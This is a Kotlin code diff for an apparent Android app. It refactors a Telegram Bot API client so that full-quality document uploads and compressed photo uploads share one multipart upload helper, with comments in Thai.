@@ -44,11 +44,41 @@ class TelegramApi(private val token: String, private val chatId: String) {
     /**
      * ส่งไฟล์แบบเต็มคุณภาพ (ไม่บีบ) ผ่าน sendDocument (multipart/form-data)
      */
-    fun sendDocument(filename: String, mime: String, size: Long, input: InputStream): Result {
+    fun sendDocument(filename: String, mime: String, input: InputStream): Result =
+        uploadFile(
+            method = "sendDocument",
+            fieldName = "document",
+            filename = filename,
+            mime = mime,
+            input = input,
+            extraFields = listOf("disable_content_type_detection" to "false")
+        )
+
+    /**
+     * ส่งเป็นรูปพรีวิว ผ่าน sendPhoto — Telegram จะบีบอัด/ย่อขนาดรูปเอง (สูงสุด ~10MB ต่อรูป)
+     */
+    fun sendPhoto(filename: String, mime: String, input: InputStream): Result =
+        uploadFile(
+            method = "sendPhoto",
+            fieldName = "photo",
+            filename = filename,
+            mime = mime,
+            input = input,
+            extraFields = emptyList()
+        )
+
+    private fun uploadFile(
+        method: String,
+        fieldName: String,
+        filename: String,
+        mime: String,
+        input: InputStream,
+        extraFields: List<Pair<String, String>>
+    ): Result {
         val boundary = "----PhotoCollector" + System.currentTimeMillis()
         var conn: HttpURLConnection? = null
         return try {
-            val url = URL("$BASE$token/sendDocument")
+            val url = URL("$BASE$token/$method")
             conn = url.openConnection() as HttpURLConnection
             conn.connectTimeout = 20000
             conn.readTimeout = 120000
@@ -61,20 +91,19 @@ class TelegramApi(private val token: String, private val chatId: String) {
             val twoHyphens = "--"
 
             DataOutputStream(conn.outputStream).use { out ->
-                // part: chat_id
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
-                out.writeBytes(chatId + lineEnd)
+                fun writeField(name: String, value: String) {
+                    out.writeBytes(twoHyphens + boundary + lineEnd)
+                    out.writeBytes("Content-Disposition: form-data; name=\"$name\"$lineEnd$lineEnd")
+                    out.writeBytes(value + lineEnd)
+                }
 
-                // part: disable content type detection off -> keep original
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes("Content-Disposition: form-data; name=\"disable_content_type_detection\"$lineEnd$lineEnd")
-                out.writeBytes("false" + lineEnd)
+                writeField("chat_id", chatId)
+                extraFields.forEach { (name, value) -> writeField(name, value) }
 
-                // part: document (file)
+                // part: ไฟล์
                 out.writeBytes(twoHyphens + boundary + lineEnd)
                 out.writeBytes(
-                    "Content-Disposition: form-data; name=\"document\"; filename=\"" +
+                    "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"" +
                         filename.replace("\"", "_") + "\"$lineEnd"
                 )
                 out.writeBytes("Content-Type: $mime$lineEnd$lineEnd")
@@ -93,7 +122,7 @@ class TelegramApi(private val token: String, private val chatId: String) {
             }
             readResult(conn)
         } catch (e: Exception) {
-            Log.w(TAG, "sendDocument error: ${e.message}")
+            Log.w(TAG, "$method error: ${e.message}")
             Result(false, error = e.message)
         } finally {
             conn?.disconnect()
